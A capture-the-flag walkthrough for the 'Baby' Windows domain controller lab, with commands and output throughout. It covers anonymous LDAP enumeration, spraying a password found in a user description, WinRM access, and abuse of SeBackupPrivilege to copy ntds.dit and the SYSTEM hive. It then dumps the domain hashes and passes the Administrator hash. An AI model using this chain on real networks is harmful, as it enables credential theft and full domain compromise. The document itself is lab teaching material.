# Machine name: Baby  
# Machine IP: 10.129.26.200    
# Type: Windows  
# Difficulty: Easy  

----
As usual, I started with port scanning:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ rustscan -a 10.129.26.200 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/faridd/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.26.200:53
Open 10.129.26.200:88
Open 10.129.26.200:135
Open 10.129.26.200:139
Open 10.129.26.200:389
Open 10.129.26.200:445
Open 10.129.26.200:464
Open 10.129.26.200:593
Open 10.129.26.200:636
Open 10.129.26.200:3268
Open 10.129.26.200:3269
Open 10.129.26.200:3389
Open 10.129.26.200:5985
Open 10.129.26.200:9389
Open 10.129.26.200:49664
Open 10.129.26.200:49669
Open 10.129.26.200:58110
Open 10.129.26.200:58122
Open 10.129.26.200:64453
Open 10.129.26.200:64454
Open 10.129.26.200:64463
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV" on ip 10.129.26.200
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-30 00:24 +0400
NSE: Loaded 158 scripts for scanning.

Completed SYN Stealth Scan at 00:24, 0.47s elapsed (21 total ports)
Initiating Service scan at 00:24

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-29 20:24:26Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-04-29T20:25:57+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-29T20:25:17+00:00
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-28T20:15:19
| Not valid after:  2026-10-28T20:15:19
| MD5:     c8c0 07b5 0b9f 3381 e350 58b0 deee cca5
| SHA-1:   f8a3 5a02 6139 0ecf 1bc3 844e 25ac 9a5d b9e6 6e82
| SHA-256: d481 c2f1 e5ea c8fb 9fa8 2dfb 0e6a d0d7 2bc1 4cfc ab46 5c31 90ca b391 75be 820b
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQQj8dzI8wp7NImcEa5zVzPjANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNjA0MjgyMDE1MTlaFw0yNjEw
| MjgyMDE1MTlaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmGtp4f8321y0G4P8umQWMxvcxnPQPMebVcf/
| eIflrpSdlApIo60hln1puIu/jemh9EvU7wDN+6Lf1/WhGUTKR7cplEdYLmtUm+SC
| oDh6nNKxJ/3uUkZrwVOKti9DH95+dO4xEBxJnNsSTeFFrby96FgUe3bMhxg6yVhy
| P0A22yvDg3KSj6heKY4gjnmwOBRVEzXK48uBOSwwru1POfp2f5aAa0Vw1OSysHCC
| JcaRvUWkxPZJN1OOXmOm1vZBwFegOAvn6E1HfvN4yUB4Pw+f/G8dNadZE0QBv/WX
| wKAZjxXhzR7opzZAiZaKPwl3BecnLfujSFQmWlGuwBvLDXWY4QIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAFKKCKvzEyFQW8hvjfrP0cGXfyBDAuZTAydBidrpz+97awb9yNViNUVn29pS
| B+RSBPrEa/XdIG7fUoGynvJxtToTLswBDqV28hBBot0tpzYlZASWnYNelXp7TYJw
| mNg0sbJwG2FAqXc6RWfEp9+bCjRSWsFIC0xsUXXND50TJ4nwlL+K9NtgIDS9MStE
| aE3N2YYjuBr1zc9JyQGSo2R3QwfypBid7Yxfgm7pPqnKU/abUEEdugUTA8Fr8zPE
| 1IOY6J19L3C0Mcgc7E9uQmvomyDfDhT0qdXYW4Il/gt5Mu0FKCUzjA6pfsgKWeOo
| HTs1dzfyNZQS1gn5972jJSEj0Ts=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58110/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58122/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64453/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
64454/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64463/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61767/tcp): CLEAN (Timeout)
|   Check 2 (port 32085/tcp): CLEAN (Timeout)
|   Check 3 (port 15940/udp): CLEAN (Timeout)
|   Check 4 (port 18588/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-29T20:25:18
|_  start_date: N/A


```

First of all, I checked **anonymous rpc** login and get the list of all exist users but it failed:    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ rpcclient -U "" 10.129.26.200 -N    
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $>
```
So, I decied to use **netexec tool** to find if there is any shared folder that we can access without any credentials:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ netexec smb 10.129.26.200 -u '' -p '' --shares
SMB         10.129.26.200   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.26.200   445    BABYDC           [+] baby.vl\: 
SMB         10.129.26.200   445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
As we can see, It allowed us to access the server without needing credentials, but does not give permission to see the shares with no username and no password. In some cases, the **"guest"** user has access to shares without needing any password so let's try it as well.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ netexec smb 10.129.26.200 -u 'guest' -p '' --shares
SMB         10.129.26.200   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED
```
It also didn't give us access. So, lets use **"LDAP" port 389**.   

## What is LDAP?  
Its main role is to find, read, edit all the directory services information over the network. If a company has 500 employees, instead of creating separate user database for each services such as Email, VPN, HR system and etc, all of them are connected to the central LDAP server (for example, active directory).     
A user can access all the systems with one password. One of the main concepts is that, all the user data like (names, surnames, duties, phone numbers, email addresses and etc are stored in there. LDAP is also used to control who can access which folder or system.      
We can use this command:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ ldapsearch -H ldap://10.129.26.200 -x -b "DC=baby,DC=vl" 
```
* **-H** --> (URI): Specifies the LDAP server's address and protocol   
* **-x** --> Uses simple authentication instead of SASL (essential for passwordless/anonymous binds)   
* **-b** --> (Base DN): Defines the starting point in the directory tree where the search begins (e.g., "DC=baby,DC=vl")   
But its output will be very large and we need to use grep for finding specific data from there. Administrators commonly use **Descriptions** because they cannot remember everything about the users and need to store these information is somewhere. Description is one of these places.      
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ ldapsearch -H ldap://10.129.26.200 -x -b "DC=baby,DC=vl" | grep "description"
description: Built-in account for guest access to the computer/domain
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all 
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Set initial password to BabyStart123!
```
In this CTF, we can see a password in there. It is a password of a user in the system so lets look at the list of users.     
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ ldapsearch -H ldap://10.129.26.200 -x -b "DC=baby,DC=vl" | grep "sAMAccountName"
sAMAccountName: Guest
sAMAccountName: Domain Computers
sAMAccountName: Cert Publishers
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
sAMAccountName: Protected Users
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: dev
sAMAccountName: Jacqueline.Barnett
sAMAccountName: Ashley.Webb
sAMAccountName: Hugh.George
sAMAccountName: Leonard.Dyer
sAMAccountName: it
sAMAccountName: Connor.Wilkinson
sAMAccountName: Joseph.Hughes
sAMAccountName: Kerry.Wilson
sAMAccountName: Teresa.Bell

```
I got it but there are **two Organizational Units** **(dev and it)**. There can be other users so, we need to check them as well.    
* **"*"** --> Sometimes some essential information like (description, memberOf, telephonenumber) may not be seen in the standard output directly. This symbol says to ldapsearch to display all the information about an object so, our answer will be accurate and complete.    
* **dn** --> It stands for "Distinguished Name". It is the complete and unique address of an object in LDAP tree. It shows which OU they belongs to, under which folder or domain they are located and etc. It looks like this (CN=Farid,OU=IT,OU=Employees,DC=baby,DC=vl).     

```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ ldapsearch -H ldap://10.129.26.200 -x -b "DC=baby,DC=vl" "*" | grep "dn"        
dn: DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl

```
As you can see, we got new users. Now lets make it clear for storing in a file. We can use this command for it (to take only usernames in this format (Joseph.Hughes):    
```bash
ldapsearch -H ldap://10.129.26.200 -x -b "DC=baby,DC=vl" "*" | grep "dn: CN" | cut -d= -f2 | cut -d, -f1 | sed "s/ /./g" > users.txt
```
Now, we have the list of all users in the system, a valid password **"BabyStart123!"**. Let's use netexec tool to figure out which user's password is it by doing brote force.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ netexec smb 10.129.26.200 -u users.txt -p 'BabyStart123!' 
SMB         10.129.26.200   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Administrator:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\krbtgt:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Domain.Computers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Domain.Controllers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Schema.Admins:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Enterprise.Admins:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Cert.Publishers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Domain.Admins:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Domain.Users:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Domain.Guests:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Group.Policy.Creator.Owners:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\RAS.and.IAS.Servers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Allowed.RODC.Password.Replication.Group:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Denied.RODC.Password.Replication.Group:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Read-only.Domain.Controllers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Enterprise.Read-only.Domain.Controllers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Cloneable.Domain.Controllers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Protected.Users:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Key.Admins:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Enterprise.Key.Admins:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\DnsAdmins:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\DnsUpdateProxy:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\dev:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\it:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.26.200   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```
As you can see all the users with our password give logon failure because this password isn't their. But when checking it for Caroline Robinson, It gave a different error "STATUS_PASSWORD_MUST_CHANGE". It means that, yeah this password is Caroline's. But It must be changed when accessing its account for the first time. The system considers this password to be 'temporary'. You must now change this password to a new one to gain full access. So let's do it.  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ smbpasswd -r 10.129.26.200 -U "Caroline.Robinson"                  
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```
I changed password from **"BabyStart123!"** to **"Password123!"**. Let's access shared folders it via **smbclient**.      
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ smbclient -L //10.129.26.200 -U 'baby.vl/Caroline.Robinson%Password123!'

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.26.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
There was nothing can be useful.  

----
# Privilege Escalation  
As you remember, **port 5985 (winrm)** is open, so we can connect this user's account via **evil-winrm**:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ evil-winrm -i 10.129.26.200 -u Caroline.Robinson -p Password123!                
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> ls
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> ls


    Directory: C:\Users\Caroline.Robinson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/29/2026   8:16 PM             34 user.txt
```
Yeahh, I got the **user.txt** flag from there. Now, I need to get Administrator password.    
```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop>
```
Woww, It is a big hint to us. **"SeBackupPrivilege"** privilege means that, we can read all the files in the system. Because to create their backup, it is required. But in windows systems we cannot do it directly. So, we will use **"diskshadow"**.      

## 1. What is Diskshadow?  
In a running Windows system, the **ntds.dit** file (which holds all domain passwords) is locked because the system is constantly using it. You cannot copy it normally.    
Diskshadow is a built-in Windows tool that uses **VSS (Volume Shadow Copy Service)**. It creates a "snapshot" (a frozen photo) of the entire drive. In this snapshot, the files are not locked, so you can copy them. Let's create a to do list for diskshadow.     
```bash
Set-Content -Path C:\Windows\Temp\shadow.txt -Value "set metadata C:\Windows\Temp\meta.cab`r`nset context persistent nowriters`r`nadd volume c: alias ntds_shadow`r`ncreate`r`nexpose %ntds_shadow% z:" -Encoding ASCII
```
* set context persistent nowriters: Tells Windows to make a stable copy that doesn't disappear immediately.  
* add volume c: alias ntds_shadow: Selects the C: drive to be copied and gives it a nickname.  
* create: Tells the system to actually take the snapshot now.  
* expose %ntds_shadow% z:: This is the magic part. It takes the frozen snapshot and makes it appear as a new drive letter (Z:). Now, the "unlocked" version of the password database is sitting on the Z: drive.  
```bash
diskshadow /s C:\Windows\Temp\shadow.txt
```
* /s (Script): This runs your to-do list automatically. After this finishes, you will see a Z: drive on the system.  
```bash
robocopy /b Z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
```
* robocopy: A powerful copy tool.  
* /b (Backup mode): This is why your SeBackupPrivilege is important. This flag tells Windows: "I am a backup operator, ignore all security restrictions and let me copy this file." It copies the database from the Z: drive to your Temp folder.  
```bash
reg save hklm\system system.bak
```
* The ntds.dit file is encrypted. The "key" to unlock it is stored in the Windows Registry. This command saves that key into a file called system.bak.  
The last thing we need is to download ntds.dit and system.bak file from the target windows machine to our kali.  
```bash
copy C:\Windows\Temp\ntds.dit .
download ntds.dit
download system.bak
```

----
Now, we have these files in our kali. Let's get all the NTLM hashes of the users. We currenctly need only the Administrator hash.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
```
Let's access the system as Administrator:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/baby]
└─$ evil-winrm -i 10.129.26.200 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/29/2026   8:16 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```
Bingoo!!! We got the root flag from there.    


























